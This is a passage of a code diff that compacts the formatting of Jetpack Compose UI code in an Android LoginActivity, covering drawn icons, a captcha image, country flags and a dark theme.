+            .clickable { onClick() }, contentAlignment = Alignment.Center) {
+            Box(modifier = Modifier.fillMaxWidth().height(2.dp).align(Alignment.TopCenter)
+                .background(Brush.verticalGradient(listOf(Color(0x80BEDCFF), Color.Transparent))))
             Text(text, color = Ex.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
         }
     }
@@ -1514,13 +982,10 @@ class LoginActivity : ComponentActivity() {
     @Composable
     fun EyeIcon(visible: Boolean, modifier: Modifier = Modifier) {
         Canvas(modifier = modifier) {
-            val w = size.width
-            val s = w / 24f
-            val stroke = Stroke(
-                width = 2f * s,
+            val w = size.width; val s = w / 24f
+            val stroke = Stroke(width = 2f * s,
                 cap = androidx.compose.ui.graphics.StrokeCap.Round,
-                join = androidx.compose.ui.graphics.StrokeJoin.Round
-            )
+                join = androidx.compose.ui.graphics.StrokeJoin.Round)
             val col = Ex.Hint
             if (!visible) {
                 val p1 = Path().apply {
@@ -1539,8 +1004,7 @@ class LoginActivity : ComponentActivity() {
                 }
                 drawPath(p1, col, style = stroke)
                 drawLine(col, Offset(1f * s, 1f * s), Offset(23f * s, 23f * s),
-                    strokeWidth = 2f * s,
-                    cap = androidx.compose.ui.graphics.StrokeCap.Round)
+                    strokeWidth = 2f * s, cap = androidx.compose.ui.graphics.StrokeCap.Round)
             } else {
                 val eye = Path().apply {
                     moveTo(1f * s, 12f * s)
@@ -1551,8 +1015,7 @@ class LoginActivity : ComponentActivity() {
                     close()
                 }
                 drawPath(eye, col, style = stroke)
-                drawCircle(col, radius = 3f * s,
-                    center = Offset(12f * s, 12f * s), style = stroke)
+                drawCircle(col, radius = 3f * s, center = Offset(12f * s, 12f * s), style = stroke)
             }
         }
     }
@@ -1561,11 +1024,9 @@ class LoginActivity : ComponentActivity() {
     fun HomeBadgeIcon() {
         Canvas(modifier = Modifier.size(15.dp)) {
             val s = size.width / 24f
-            val stroke = Stroke(
-                width = 2f * s,
+            val stroke = Stroke(width = 2f * s,
                 cap = androidx.compose.ui.graphics.StrokeCap.Round,
-                join = androidx.compose.ui.graphics.StrokeJoin.Round
-            )
+                join = androidx.compose.ui.graphics.StrokeJoin.Round)
             val p = Path().apply {
                 moveTo(3f * s, 10f * s); lineTo(12f * s, 3f * s); lineTo(21f * s, 10f * s)
                 moveTo(5f * s, 9f * s); lineTo(5f * s, 20f * s); lineTo(19f * s, 20f * s); lineTo(19f * s, 9f * s)
@@ -1582,25 +1043,20 @@ class LoginActivity : ComponentActivity() {
             val p = Path().apply {
                 moveTo(15f * s, 18f * s); lineTo(9f * s, 12f * s); lineTo(15f * s, 6f * s)
             }
-            drawPath(p, Ex.BackBtnIco,
-                style = Stroke(width = 2.4f * s,
-                    cap = androidx.compose.ui.graphics.StrokeCap.Round,
-                    join = androidx.compose.ui.graphics.StrokeJoin.Round))
+            drawPath(p, Ex.BackBtnIco, style = Stroke(width = 2.4f * s,
+                cap = androidx.compose.ui.graphics.StrokeCap.Round,
+                join = androidx.compose.ui.graphics.StrokeJoin.Round))
         }
     }
 
     @Composable
     fun CardTopCurve(modifier: Modifier = Modifier) {
         Canvas(modifier = modifier) {
-            val w = size.width
-            val h = size.height
-            drawCircle(
-                brush = Brush.radialGradient(
-                    listOf(Color(0x728CB9FF), Color.Transparent),
-                    center = Offset(w * 0.5f, h), radius = w * 0.3f
-                ),
-                radius = w * 0.3f, center = Offset(w * 0.5f, h)
-            )
+            val w = size.width; val h = size.height
+            drawCircle(brush = Brush.radialGradient(
+                listOf(Color(0x728CB9FF), Color.Transparent),
+                center = Offset(w * 0.5f, h), radius = w * 0.3f),
+                radius = w * 0.3f, center = Offset(w * 0.5f, h))
             val glow = Path().apply {
                 moveTo(0f, 11f / 45f * h)
                 quadraticBezierTo(w * 0.5f, 42.5f / 45f * h, w, 11f / 45f * h)
@@ -1619,36 +1075,26 @@ class LoginActivity : ComponentActivity() {
     fun CaptchaImage(code: String, modifier: Modifier = Modifier) {
         val capData = remember(code) {
             val cols = listOf(0xFF27AE60L, 0xFF2980B9L, 0xFF8E44ADL, 0xFFC0392BL, 0xFF16A085L)
-            val lines = List(3) {
-                CapLine(
-                    x1 = Random.nextFloat(), y1 = Random.nextFloat(),
-                    x2 = Random.nextFloat(), y2 = Random.nextFloat(),
-                    r = Random.nextInt(150), g = Random.nextInt(150), b = Random.nextInt(150)
-                )
-            }
-            val glyphs = code.map { ch ->
-                CapGlyph(
-                    ch = ch, color = cols[Random.nextInt(cols.size)],
-                    rot = (Random.nextFloat() - 0.5f) * 0.7f * 57.2958f,
-                    fontSp = 20f + Random.nextFloat() * 6f,
-                    dy = Random.nextFloat() * 5f - 2f
-                )
-            }
+            val lines = List(3) { CapLine(
+                x1 = Random.nextFloat(), y1 = Random.nextFloat(),
+                x2 = Random.nextFloat(), y2 = Random.nextFloat(),
+                r = Random.nextInt(150), g = Random.nextInt(150), b = Random.nextInt(150)) }
+            val glyphs = code.map { ch -> CapGlyph(
+                ch = ch, color = cols[Random.nextInt(cols.size)],
+                rot = (Random.nextFloat() - 0.5f) * 0.7f * 57.2958f,
+                fontSp = 20f + Random.nextFloat() * 6f,
+                dy = Random.nextFloat() * 5f - 2f) }
             lines to glyphs
         }
         val (lines, glyphs) = capData
         Canvas(modifier = modifier) {
-            val w = size.width
-            val h = size.height
-            val sx = w / 88f
-            val sy = h / 40f
+            val w = size.width; val h = size.height
+            val sx = w / 88f; val sy = h / 40f
             drawRect(Color.White)
             lines.forEach { l ->
-                val argb = (0x99L shl 24) or
-                    (l.r.toLong() shl 16) or (l.g.toLong() shl 8) or l.b.toLong()
-                drawLine(Color(argb),
-                    Offset(l.x1 * w, l.y1 * h), Offset(l.x2 * w, l.y2 * h),
-                    strokeWidth = 1.2f * sx)
+                val argb = (0x99L shl 24) or (l.r.toLong() shl 16) or (l.g.toLong() shl 8) or l.b.toLong()
+                drawLine(Color(argb), Offset(l.x1 * w, l.y1 * h),
+                    Offset(l.x2 * w, l.y2 * h), strokeWidth = 1.2f * sx)
             }
             glyphs.forEachIndexed { i, gl ->
                 val px = (10f + i * 19f) * sx
@@ -1671,8 +1117,7 @@ class LoginActivity : ComponentActivity() {
     @Composable
     fun FlagIcon(code: String, modifier: Modifier = Modifier) {
         Canvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
-            val w = size.width
-            val h = size.height
+            val w = size.width; val h = size.height
             when (code) {
                 "sa" -> {
                     drawRect(Color(0xFF165B33))
@@ -1683,26 +1128,19 @@ class LoginActivity : ComponentActivity() {
                 }
                 "us" -> {
                     val stripe = h / 13f
-                    for (i in 0 until 13) {
-                        drawRect(color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
-                            topLeft = Offset(0f, i * stripe), size = Size(w, stripe + 1f))
-                    }
+                    for (i in 0 until 13) drawRect(
+                        color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
+                        topLeft = Offset(0f, i * stripe), size = Size(w, stripe + 1f))
                     drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero, size = Size(w * 0.45f, stripe * 7f))
                 }
-                "cn" -> {
-                    drawRect(Color(0xFFDE2910))
-                    drawPath(starPath(w*0.22f, h*0.32f, h*0.22f), Color(0xFFFFDE00))
-                }
+                "cn" -> { drawRect(Color(0xFFDE2910)); drawPath(starPath(w*0.22f, h*0.32f, h*0.22f), Color(0xFFFFDE00)) }
                 "tw" -> {
                     drawRect(Color(0xFFFE0000))
                     drawRect(Color(0xFF000095), topLeft = Offset.Zero, size = Size(w * 0.5f, h * 0.5f))
                     drawCircle(Color.White, radius = h*0.12f, center = Offset(w*0.25f, h*0.25f))
                     drawCircle(Color(0xFF000095), radius = h*0.08f, center = Offset(w*0.25f, h*0.25f))
                 }
-                "jp" -> {
-                    drawRect(Color.White)
-                    drawCircle(Color(0xFFBC002D), radius = h*0.3f, center = Offset(w/2f, h/2f))
-                }
+                "jp" -> { drawRect(Color.White); drawCircle(Color(0xFFBC002D), radius = h*0.3f, center = Offset(w/2f, h/2f)) }
                 "tr" -> {
                     drawRect(Color(0xFFE30A17))
                     drawCircle(Color.White, radius = h*0.3f, center = Offset(w*0.38f, h/2f))
@@ -1711,15 +1149,11 @@ class LoginActivity : ComponentActivity() {
                 }
                 "kr" -> {
                     drawRect(Color.White)
-                    val d = h * 0.56f
-                    val tl = Offset(w/2f - d/2f, h/2f - d/2f)
+                    val d = h * 0.56f; val tl = Offset(w/2f - d/2f, h/2f - d/2f)
                     drawArc(Color(0xFFCD2E3A), 180f, 180f, true, tl, Size(d, d))
                     drawArc(Color(0xFF0047A0), 0f, 180f, true, tl, Size(d, d))
                 }
-                "vn" -> {
-                    drawRect(Color(0xFFDA251D))
-                    drawPath(starPath(w/2f, h/2f, h*0.28f), Color(0xFFFFFF00))
-                }
+                "vn" -> { drawRect(Color(0xFFDA251D)); drawPath(starPath(w/2f, h/2f, h*0.28f), Color(0xFFFFFF00)) }
                 "fr" -> {
                     drawRect(Color(0xFF0055A4), size = Size(w/3f, h))
                     drawRect(Color.White, topLeft = Offset(w/3f, 0f), size = Size(w/3f, h))
@@ -1765,8 +1199,7 @@ class LoginActivity : ComponentActivity() {
             val y = cy + (r * Math.sin(angle)).toFloat()
             if (i == 0) path.moveTo(x, y) else path.lineTo(x, y)
         }
-        path.close()
-        return path
+        path.close(); return path
     }
 
     private fun newCaptchaCode(): String {
@@ -1777,14 +1210,8 @@ class LoginActivity : ComponentActivity() {
 
 @Composable
 fun AppTheme(content: @Composable () -> Unit) {
-    MaterialTheme(
-        colorScheme = darkColorScheme(
-            primary = Ex.BlueAccent,
-            background = Ex.Bg4,
-            surface = Ex.CardBg,
-            onPrimary = Color.White,
-            onBackground = Color.White,
-            onSurface = Color.White
-        )
-    ) { content() }
+    MaterialTheme(colorScheme = darkColorScheme(
+        primary = Ex.BlueAccent, background = Ex.Bg4, surface = Ex.CardBg,
+        onPrimary = Color.White, onBackground = Color.White, onSurface = Color.White
+    )) { content() }
 }
